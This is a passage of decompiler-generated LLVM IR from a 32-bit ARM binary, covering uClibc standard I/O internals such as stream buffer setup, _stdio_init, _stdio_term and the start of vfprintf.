  store i32 %v0_12634, i32* @r0, align 4
  %v1_12638 = inttoptr i32 %v0_1262c to i32*
  %v2_12638 = load i32, i32* %v1_12638, align 4
  store i32 %v2_12638, i32* @r5, align 4
  %v1_1263c = call i32 @isatty(i32 %v0_12634)
  store i32 %v1_1263c, i32* %r0.global-to-local, align 4
  %v2_12640 = icmp eq i32 %v1_1263c, 0
  br i1 %v2_12640, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_1262c
  %v1_12644 = load i32, i32* @sb, align 4
  %v2_12644 = inttoptr i32 %v1_12644 to i16*
  %v3_12644 = load i16, i16* %v2_12644, align 2
  %v4_12644 = zext i16 %v3_12644 to i32
  %v2_12648 = or i32 %v4_12644, 256
  store i32 %v2_12648, i32* %r3.global-to-local, align 4
  %v2_1264c = trunc i32 %v2_12648 to i16
  store i16 %v2_1264c, i16* %v2_12644, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1262c, %bb41
  %v0_12650 = load i32, i32* @r5, align 4
  %v1_12650 = load i32, i32* @r4, align 4
  %v2_12650 = inttoptr i32 %v1_12650 to i32*
  store i32 %v0_12650, i32* %v2_12650, align 4
  br label %dec_label_pc_12654

dec_label_pc_12654:                               ; preds = %bb40, %.thread7
  %v0_12654 = load i32, i32* @sb, align 4
  %v1_12654 = add i32 %v0_12654, 8
  %v2_12654 = inttoptr i32 %v1_12654 to i32*
  %v3_12654 = load i32, i32* %v2_12654, align 4
  store i32 %v3_12654, i32* %r3.global-to-local, align 4
  %v2_12658 = icmp eq i32 %v3_12654, 0
  br i1 %v2_12658, label %dec_label_pc_12660, label %bb42

dec_label_pc_12660:                               ; preds = %dec_label_pc_12654
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_12664 = call i32 @malloc(i32 4096)
  store i32 %v1_12664, i32* %r0.global-to-local, align 4
  %v2_12668 = icmp eq i32 %v1_12664, 0
  %v1_12678.pre = load i32, i32* @sb, align 4
  br i1 %v2_12668, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_12660
  %v2_1266c = inttoptr i32 %v1_12678.pre to i16*
  %v3_1266c = load i16, i16* %v2_1266c, align 2
  %v4_1266c = zext i16 %v3_1266c to i32
  %v2_12670 = add i32 %v1_12664, 4096
  store i32 %v2_12670, i32* %r2.global-to-local, align 4
  %v2_12674 = or i32 %v4_1266c, 16384
  store i32 %v2_12674, i32* %r3.global-to-local, align 4
  %v2_12678 = add i32 %v1_12678.pre, 8
  %v3_12678 = inttoptr i32 %v2_12678 to i32*
  store i32 %v1_12664, i32* %v3_12678, align 4
  %v1_1267c = load i32, i32* %r2.global-to-local, align 4
  %v2_1267c = load i32, i32* @sb, align 4
  %v3_1267c = add i32 %v2_1267c, 12
  %v4_1267c = inttoptr i32 %v3_1267c to i32*
  store i32 %v1_1267c, i32* %v4_1267c, align 4
  %v1_12680 = load i32, i32* %r3.global-to-local, align 4
  %v2_12680 = trunc i32 %v1_12680 to i16
  %v3_12680 = load i32, i32* @sb, align 4
  %v4_12680 = inttoptr i32 %v3_12680 to i16*
  store i16 %v2_12680, i16* %v4_12680, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_12660
  %v2_1267821 = add i32 %v1_12678.pre, 8
  %v3_1267822 = inttoptr i32 %v2_1267821 to i32*
  store i32 0, i32* %v3_1267822, align 4
  %v2_12684 = load i32, i32* @sb, align 4
  %v3_12684 = add i32 %v2_12684, 12
  %v4_12684 = inttoptr i32 %v3_12684 to i32*
  store i32 0, i32* %v4_12684, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_12654, %.thread11
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_12690 = load i32, i32* @fp, align 4
  %v2_12690 = add i32 %v0_12690, 64
  %v3_12690 = inttoptr i32 %v2_12690 to i32*
  %v4_12690 = load i32, i32* %v3_12690, align 4
  store i32 %v4_12690, i32* %r3.global-to-local, align 4
  %v2_12694 = load i32, i32* @sb, align 4
  %v3_12694 = add i32 %v2_12694, 2
  %v4_12694 = inttoptr i32 %v3_12694 to i8*
  store i8 0, i8* %v4_12694, align 1
  %v0_12698 = load i32, i32* @sb, align 4
  %v1_12698 = inttoptr i32 %v0_12698 to i16*
  %v2_12698 = load i16, i16* %v1_12698, align 2
  %v3_12698 = zext i16 %v2_12698 to i32
  store i32 %v3_12698, i32* %r2.global-to-local, align 4
  %v0_1269c = load i32, i32* %r3.global-to-local, align 4
  %v1_1269c = inttoptr i32 %v0_1269c to i32*
  %v2_1269c = load i32, i32* %v1_1269c, align 4
  store i32 %v2_1269c, i32* %r1.global-to-local, align 4
  %v1_126a0 = add i32 %v0_12698, 8
  %v2_126a0 = inttoptr i32 %v1_126a0 to i32*
  %v3_126a0 = load i32, i32* %v2_126a0, align 4
  store i32 %v3_126a0, i32* %r3.global-to-local, align 4
  %v1_126a4 = and i32 %v3_12698, 8192
  %v2_126a4 = icmp eq i32 %v1_126a4, 0
  %v2_126a8 = add i32 %v0_12698, 20
  %v3_126a8 = inttoptr i32 %v2_126a8 to i32*
  store i32 %v3_126a0, i32* %v3_126a8, align 4
  %v0_126ac = load i32, i32* %r0.global-to-local, align 4
  %v1_126ac = load i32, i32* @sb, align 4
  %v2_126ac = add i32 %v1_126ac, 44
  %v3_126ac = inttoptr i32 %v2_126ac to i32*
  store i32 %v0_126ac, i32* %v3_126ac, align 4
  %v0_126b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_126b0 = load i32, i32* @sb, align 4
  %v2_126b0 = add i32 %v1_126b0, 52
  %v3_126b0 = inttoptr i32 %v2_126b0 to i32*
  store i32 %v0_126b0, i32* %v3_126b0, align 4
  %v0_126b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_126b4 = load i32, i32* @sb, align 4
  %v2_126b4 = add i32 %v1_126b4, 24
  %v3_126b4 = inttoptr i32 %v2_126b4 to i32*
  store i32 %v0_126b4, i32* %v3_126b4, align 4
  %v0_126b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_126b8 = load i32, i32* @sb, align 4
  %v2_126b8 = add i32 %v1_126b8, 28
  %v3_126b8 = inttoptr i32 %v2_126b8 to i32*
  store i32 %v0_126b8, i32* %v3_126b8, align 4
  %v0_126bc = load i32, i32* %r3.global-to-local, align 4
  %v1_126bc = load i32, i32* @sb, align 4
  %v2_126bc = add i32 %v1_126bc, 16
  %v3_126bc = inttoptr i32 %v2_126bc to i32*
  store i32 %v0_126bc, i32* %v3_126bc, align 4
  br i1 %v2_126a4, label %dec_label_pc_12778, label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %bb42
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_126c8 = load i32, i32* @fp, align 4
  %v2_126c8 = add i32 %v0_126c8, 40
  %v3_126c8 = inttoptr i32 %v2_126c8 to i32*
  %v4_126c8 = load i32, i32* %v3_126c8, align 4
  store i32 %v4_126c8, i32* %r8.global-to-local, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v2_126d0 = add i32 %v0_126c8, 116
  %v3_126d0 = inttoptr i32 %v2_126d0 to i32*
  %v4_126d0 = load i32, i32* %v3_126d0, align 4
  store i32 %v4_126d0, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_126d8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_126dc = add i32 %v0_126c8, 80
  %v3_126dc = inttoptr i32 %v2_126dc to i32*
  %v4_126dc = load i32, i32* %v3_126dc, align 4
  store i32 %v4_126c8, i32* %r1.global-to-local, align 4
  store i32 %v4_126d0, i32* %r2.global-to-local, align 4
  store i32 %v2_126d8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_126dc)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_126f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_126f8, i32* %r0.global-to-local, align 4
  %v0_126fc = load i32, i32* @fp, align 4
  %v2_126fc = add i32 %v0_126fc, 20
  %v3_126fc = inttoptr i32 %v2_126fc to i32*
  %v4_126fc = load i32, i32* %v3_126fc, align 4
  call void @__pseudo_branch(i32 %v4_126fc)
  store i32 104, i32* %r3.global-to-local, align 4
  %v0_1270c = load i32, i32* @fp, align 4
  %v2_1270c = add i32 %v0_1270c, 104
  %v3_1270c = inttoptr i32 %v2_1270c to i32*
  %v4_1270c = load i32, i32* %v3_1270c, align 4
  store i32 %v4_1270c, i32* %r4.global-to-local, align 4
  %v0_12710 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12710, i32* %r1.global-to-local, align 4
  store i32 %v4_1270c, i32* %r2.global-to-local, align 4
  store i32 %v2_124c8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_126dc)
  store i32 %v4_1270c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_126fc)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_12734 = load i32, i32* @fp, align 4
  %v2_12734 = add i32 %v0_12734, 52
  %v3_12734 = inttoptr i32 %v2_12734 to i32*
  %v4_12734 = load i32, i32* %v3_12734, align 4
  store i32 %v4_12734, i32* @ip, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v1_1273c = inttoptr i32 %v4_12734 to i32*
  %v2_1273c = load i32, i32* %v1_1273c, align 4
  store i32 %v2_1273c, i32* %r2.global-to-local, align 4
  store i32 %v2_124c8, i32* %r0.global-to-local, align 4
  %v1_12744 = load i32, i32* @sb, align 4
  %v2_12744 = add i32 %v1_12744, 32
  %v3_12744 = inttoptr i32 %v2_12744 to i32*
  store i32 %v2_1273c, i32* %v3_12744, align 4
  %v0_12748 = load i32, i32* @fp, align 4
  %v1_12748 = load i32, i32* %r3.global-to-local, align 4
  %v2_12748 = add i32 %v1_12748, %v0_12748
  %v3_12748 = inttoptr i32 %v2_12748 to i32*
  %v4_12748 = load i32, i32* %v3_12748, align 4
  store i32 %v4_12748, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_12750 = load i32, i32* @sb, align 4
  %v1_12750 = load i32, i32* @ip, align 4
  %v2_12750 = inttoptr i32 %v1_12750 to i32*
  store i32 %v0_12750, i32* %v2_12750, align 4
  call void @__pseudo_branch(i32 %v4_12748)
  store i32 %v2_126d8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12748)
  br label %dec_label_pc_12778

dec_label_pc_12774:                               ; preds = %dec_label_pc_12508, %dec_label_pc_124f4, %dec_label_pc_12514
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_12778

dec_label_pc_12778:                               ; preds = %bb42, %dec_label_pc_1254c, %dec_label_pc_126c4, %dec_label_pc_12774
  %v0_12778 = load i32, i32* @sb, align 4
  store i32 %v0_12778, i32* %r0.global-to-local, align 4
  %v2_12780 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12780, i32* @r4, align 4
  store i32 %v6_124b4, i32* @r5, align 4
  store i32 %v9_124b4, i32* @r6, align 4
  store i32 %v18_124b4, i32* @sb, align 4
  store i32 %v24_124b4, i32* @fp, align 4
  ret i32 %v0_12778

; uselistorder directives
  uselistorder i32 %v1_12678.pre, { 2, 1, 0 }
  uselistorder i32 %v0_1260c, { 1, 2, 0 }
  uselistorder i32 %v0_125d8, { 1, 0 }
  uselistorder i32 %v1_1259c, { 1, 0 }
  uselistorder i32 %v0_1259c, { 1, 0 }
  uselistorder i32 %v1_12584, { 1, 0, 2 }
  uselistorder i32 %v1_1253c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12778, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12774, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12654, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_125cc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12574, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_12524, { 2, 1, 0 }
  uselistorder label %dec_label_pc_124f4, { 1, 2, 0 }
}

define i32 @function_1278c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1278c:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1278c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1278c, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_1278c
  %v3_12794 = and i32 %arg4, %arg3
  %v2_12798 = trunc i32 %v3_12794 to i16
  %v4_12798 = inttoptr i32 %v3_12794 to i16*
  store i16 %v2_12798, i16* %v4_12798, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1278c, %bb
  %v10_127b8 = phi i32 [ %tmp, %dec_label_pc_1278c ], [ 0, %bb ]
  ret i32 %v10_127b8

; uselistorder directives
  uselistorder i32 %v3_12794, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_127c0 = call i32 @__GI___errno_location()
  store i32 %v0_127c0, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_127cc = inttoptr i32 %v0_127c0 to i32*
  %v2_127cc = load i32, i32* %v1_127cc, align 4
  store i32 %v2_127cc, i32* @r6, align 4
  %v1_127d0 = call i32 @isatty(i32 0)
  %v2_127d8 = icmp eq i32 %v1_127d0, 0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  br i1 %v2_127d8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_127e4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 832) to i16*), align 4
  %v7_127e4 = zext i16 %v5_127e4 to i32
  %v2_127e8 = xor i32 %v7_127e4, 256
  store i32 %v2_127e8, i32* @r3, align 4
  %v2_127ec = trunc i32 %v2_127e8 to i16
  store i16 %v2_127ec, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 832) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_127f4 = call i32 @isatty(i32 1)
  %v2_127f8 = icmp eq i32 %v1_127f4, 0
  br i1 %v2_127f8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_12800 = load i32, i32* @r4, align 4
  %v2_12804 = add i32 %v1_12800, 912
  %v3_12804 = inttoptr i32 %v2_12804 to i16*
  %v4_12804 = load i16, i16* %v3_12804, align 2
  %v2_12808 = xor i16 %v4_12804, 256
  store i16 %v2_12808, i16* %v3_12804, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_12810 = load i32, i32* @r6, align 4
  %v1_12810 = load i32, i32* @r5, align 4
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  store i32 %v0_12810, i32* %v2_12810, align 4
  ret i32 %v1_127f4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5472), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_12840 = call i32 @memcpy()
  ret i32 %v0_12840
}

define i32 @_stdio_term(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12858 = load i32, i32* @r4, align 4
  store i32 %v3_12858, i32* %stack_var_-24, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r6.global-to-local, align 4
  %v4_12868 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 104) to i32*), align 4
  store i32 %v4_12868, i32* @r0, align 4
  %v1_1286c = call i32 @__stdio_init_mutex(i32 %v4_12868)
  store i32 %v1_1286c, i32* %r0.global-to-local, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_12874 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 116) to i32*), align 4
  store i32 %v4_12874, i32* @r0, align 4
  %v1_12878 = call i32 @__stdio_init_mutex(i32 %v4_12874)
  store i32 %v1_12878, i32* %r0.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_12880 = load i32, i32* %r6.global-to-local, align 4
  %v2_12880 = add i32 %v0_12880, 52
  %v3_12880 = inttoptr i32 %v2_12880 to i32*
  %v4_12880 = load i32, i32* %v3_12880, align 4
  store i32 %v4_12880, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  %v1_12888 = inttoptr i32 %v4_12880 to i32*
  %v2_12888 = load i32, i32* %v1_12888, align 4
  store i32 %v2_12888, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_128d45 = add i32 %v2_12888, 56
  store i32 %v1_128d45, i32* @r5, align 4
  %v2_128d87 = icmp eq i32 %v2_12888, 0
  store i32 %v1_128d45, i32* %r0.global-to-local, align 4
  br i1 %v2_128d87, label %dec_label_pc_128e4, label %dec_label_pc_12894

dec_label_pc_12894:                               ; preds = %entry, %dec_label_pc_128c8.dec_label_pc_12894_crit_edge
  %v1_12894 = phi i32 [ %v1_12894.pre, %dec_label_pc_128c8.dec_label_pc_12894_crit_edge ], [ 48, %entry ]
  %v0_12894 = phi i32 [ %v0_128e8.pre, %dec_label_pc_128c8.dec_label_pc_12894_crit_edge ], [ %v0_12880, %entry ]
  %v2_12894 = add i32 %v0_12894, %v1_12894
  %v3_12894 = inttoptr i32 %v2_12894 to i32*
  %v4_12894 = load i32, i32* %v3_12894, align 4
  store i32 %v4_12894, i32* @ip, align 4
  store i32 75936, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12894)
  %v0_128a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_128a0 = icmp eq i32 %v0_128a0, 0
  %v0_128a4 = load i32, i32* @r5, align 4
  store i32 %v0_128a4, i32* @r0, align 4
  br i1 %v2_128a0, label %dec_label_pc_128c8, label %dec_label_pc_128ac

dec_label_pc_128ac:                               ; preds = %dec_label_pc_12894
  %v0_128ac = load i32, i32* @r4, align 4
  %v1_128ac = add i32 %v0_128ac, 8
  %v2_128ac = inttoptr i32 %v1_128ac to i32*
  %v3_128ac = load i32, i32* %v2_128ac, align 4
  store i32 %v3_128ac, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_128b4 = add i32 %v0_128ac, 20
  %v3_128b4 = inttoptr i32 %v2_128b4 to i32*
  store i32 %v3_128ac, i32* %v3_128b4, align 4
  %v0_128b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_128b8 = trunc i32 %v0_128b8 to i16
  %v2_128b8 = load i32, i32* @r4, align 4
  %v3_128b8 = inttoptr i32 %v2_128b8 to i16*
  store i16 %v1_128b8, i16* %v3_128b8, align 2
  %v0_128bc = load i32, i32* %r3.global-to-local, align 4
  %v1_128bc = load i32, i32* @r4, align 4
  %v2_128bc = add i32 %v1_128bc, 24
  %v3_128bc = inttoptr i32 %v2_128bc to i32*
  store i32 %v0_128bc, i32* %v3_128bc, align 4
  %v0_128c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_128c0 = load i32, i32* @r4, align 4
  %v2_128c0 = add i32 %v1_128c0, 28
  %v3_128c0 = inttoptr i32 %v2_128c0 to i32*
  store i32 %v0_128c0, i32* %v3_128c0, align 4
  %v0_128c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_128c4 = load i32, i32* @r4, align 4
  %v2_128c4 = add i32 %v1_128c4, 16
  %v3_128c4 = inttoptr i32 %v2_128c4 to i32*
  store i32 %v0_128c4, i32* %v3_128c4, align 4
  br label %dec_label_pc_128c8

dec_label_pc_128c8:                               ; preds = %dec_label_pc_12894, %dec_label_pc_128ac
  %v0_128c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_128c8 = load i32, i32* @r4, align 4
  %v2_128c8 = add i32 %v1_128c8, 52
  %v3_128c8 = inttoptr i32 %v2_128c8 to i32*
  store i32 %v0_128c8, i32* %v3_128c8, align 4
  %v1_128cc = call i32 @__stdio_init_mutex(i32 %v0_128a4)
  store i32 %v1_128cc, i32* %r0.global-to-local, align 4
  %v0_128d0 = load i32, i32* @r4, align 4
  %v1_128d0 = add i32 %v0_128d0, 32
  %v2_128d0 = inttoptr i32 %v1_128d0 to i32*
  %v3_128d0 = load i32, i32* %v2_128d0, align 4
  store i32 %v3_128d0, i32* @r4, align 4
  %v1_128d4 = add i32 %v3_128d0, 56
  store i32 %v1_128d4, i32* @r5, align 4
  %v2_128d8 = icmp eq i32 %v3_128d0, 0
  store i32 %v1_128d4, i32* %r0.global-to-local, align 4
  %v0_128e8.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_128d8, label %dec_label_pc_128e4, label %dec_label_pc_128c8.dec_label_pc_12894_crit_edge

dec_label_pc_128c8.dec_label_pc_12894_crit_edge:  ; preds = %dec_label_pc_128c8
  %v1_12894.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12894

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128c8, %entry
  %v1_1291414 = phi i32 [ %v1_128d45, %entry ], [ %v1_128d4, %dec_label_pc_128c8 ]
  %v0_128e8 = phi i32 [ %v0_12880, %entry ], [ %v0_128e8.pre, %dec_label_pc_128c8 ]
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_128e8 = add i32 %v0_128e8, 52
  %v3_128e8 = inttoptr i32 %v2_128e8 to i32*
  %v4_128e8 = load i32, i32* %v3_128e8, align 4
  store i32 %v4_128e8, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_128e8 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_129084 = icmp eq i32 %storemerge2, 0
  br i1 %v2_129084, label %dec_label_pc_12910, label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e4, %dec_label_pc_12908
  %v1_128fc = phi i32 [ %storemerge, %dec_label_pc_12908 ], [ %storemerge2, %dec_label_pc_128e4 ]
  %v1_128f4 = inttoptr i32 %v1_128fc to i16*
  %v2_128f4 = load i16, i16* %v1_128f4, align 2
  %v3_128f4 = zext i16 %v2_128f4 to i32
  store i32 %v3_128f4, i32* %r3.global-to-local, align 4
  %v1_128f8 = and i32 %v3_128f4, 64
  %v2_128f8 = icmp eq i32 %v1_128f8, 0
  br i1 %v2_128f8, label %dec_label_pc_12908, label %bb

bb:                                               ; preds = %dec_label_pc_128f4
  store i32 %v1_128fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12908

dec_label_pc_12908:                               ; preds = %dec_label_pc_128f4, %bb
  %v1_12900 = xor i1 %v2_128f8, true
  call void @__pseudo_cond_branch(i1 %v1_12900, i32 ptrtoint (i32* @global_var_1292c.1024 to i32))
  %v0_12904 = load i32, i32* %r4.global-to-local, align 4
  %v1_12904 = add i32 %v0_12904, 32
  %storemerge.in = inttoptr i32 %v1_12904 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_12908 = icmp eq i32 %storemerge, 0
  br i1 %v2_12908, label %dec_label_pc_12908.dec_label_pc_12910_crit_edge, label %dec_label_pc_128f4

dec_label_pc_12908.dec_label_pc_12910_crit_edge:  ; preds = %dec_label_pc_12908
  %v1_12914.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12910

dec_label_pc_12910:                               ; preds = %dec_label_pc_12908.dec_label_pc_12910_crit_edge, %dec_label_pc_128e4
  %v1_12914 = phi i32 [ %v1_12914.pre, %dec_label_pc_12908.dec_label_pc_12910_crit_edge ], [ %v1_1291414, %dec_label_pc_128e4 ]
  %v2_12910 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12910, i32* %r4.global-to-local, align 4
  ret i32 %v1_12914

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_12880, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 0, 1, 2, 6, 7, 3, 4 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12908, { 1, 0 }
  uselistorder label %dec_label_pc_128f4, { 1, 0 }
  uselistorder label %dec_label_pc_128c8, { 1, 0 }
  uselistorder label %dec_label_pc_12894, { 1, 0 }
}

define i32 @function_1291c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1291c:
  %v0_1291c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1291c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1291c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1291c, %bb
  %v10_12928 = phi i32 [ %arg1, %dec_label_pc_1291c ], [ 0, %bb ]
  ret i32 %v10_12928

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1292c = load i32, i32* @r4, align 4
  store i32 %v3_1292c, i32* %stack_var_-8, align 4
  %v0_12930 = load i32, i32* @r0, align 4
  %v1_12930 = add i32 %v0_12930, 8
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  %v1_12934 = add i32 %v0_12930, 16
  %v2_12934 = inttoptr i32 %v1_12934 to i32*
  %v3_12934 = load i32, i32* %v2_12934, align 4
  %v9_12938 = icmp eq i32 %v3_12934, %v3_12930
  store i32 %v0_12930, i32* %r4.global-to-local, align 4
  br i1 %v9_12938, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_12930, i32* %v2_12934, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_12944 = xor i1 %v9_12938, true
  call void @__pseudo_cond_branch(i1 %v1_12944, i32 ptrtoint (i32* @global_var_185a0.1025 to i32))
  %v0_12948 = load i32, i32* %r4.global-to-local, align 4
  %v1_12948 = add i32 %v0_12948, 8
  %v2_12948 = inttoptr i32 %v1_12948 to i32*
  %v3_12948 = load i32, i32* %v2_12948, align 4
  %v1_1294c = add i32 %v0_12948, 16
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  %v2_12950 = sub i32 %v3_1294c, %v3_12948
  %v2_12954 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12954, i32* @r4, align 4
  ret i32 %v2_12950

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_1295c = load i32, i32* @r4, align 4
  store i32 %v3_1295c, i32* %stack_var_-28, align 4
  %v2_12960 = add i32 %tmp, 52
  %v3_12960 = inttoptr i32 %v2_12960 to i32*
  %v4_12960 = load i32, i32* %v3_12960, align 4
  %v1_12968 = sub i32 1, %v4_12960
  %v2_12968 = icmp ult i32 %v4_12960, 2
  br i1 %v2_12968, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge21 = phi i32 [ 0, %bb ], [ %v1_12968, %entry ]
  %v0_12970 = phi i32 [ 0, %bb ], [ %v1_12968, %entry ]
  store i32 %storemerge21, i32* @r7, align 4
  %v2_12970 = icmp eq i32 %v0_12970, 0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r8, align 4
  br i1 %v2_12970, label %dec_label_pc_129c4, label %dec_label_pc_1298c

dec_label_pc_1298c:                               ; preds = %bb16
  %v2_12990 = add i32 %tmp, 56
  store i32 %v2_12990, i32* @r4, align 4
  %v4_129a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_129a4)
  %v0_129b8 = load i32, i32* @r6, align 4
  %v2_129b8 = add i32 %v0_129b8, 20
  %v3_129b8 = inttoptr i32 %v2_129b8 to i32*
  %v4_129b8 = load i32, i32* %v3_129b8, align 4
